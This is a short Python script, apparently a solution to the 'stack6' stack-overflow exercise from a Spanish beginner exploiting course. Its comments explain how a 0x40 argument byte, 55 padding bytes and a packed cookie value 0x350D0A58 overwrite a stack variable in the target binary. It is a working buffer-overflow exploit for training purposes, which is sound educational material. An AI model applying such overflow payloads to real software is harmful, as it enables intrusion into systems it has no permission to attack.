#Solucion stack6 by hdbreaker
#http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/009%20stack6.idb/
import struct
import subprocess
#El stack tiene un largo de 160 Bytes
#Existe otro array de 100 bytes
#First if cmp eax, 45
#En el ASM se toma un valor por argv[1] y se le suma 5 (add eax, 5) 
#para luego compararlo con 0x45 (cmp eax, 45), por lo que nosotros 
#para cumplir esta condicion debemos proporcionar el valor equivalente al hexa 0x40
argv1 = "\x40" 
#Segun ida con 54 bytes nos paramos en la base de var_4, pero en la practica necesite de 55 bytes
secondBuffer = "\x90" * 55 #Desbordamos el buffer con el fin de pisar var_4 que sera el valor arg_0 de la funcoin check().
#Aca entra a check(), al igual que en stack5 esta es una funcion dummy, ya que no debemos cumplir la
#funcion interna porq la suma de los dos parametros nunca retornara la cookie necesaria que es: 0x350D0A58
#Por lo que, por medio del buffer overflow se busca setear el primer argumento de check a 0x350D0A58, posicionarlo en eax y retornar
arg_0 = struct.pack("<I", 0x350D0A58)
payload = argv1+secondBuffer+arg_0
subprocess.call(["stack6.exe", payload])
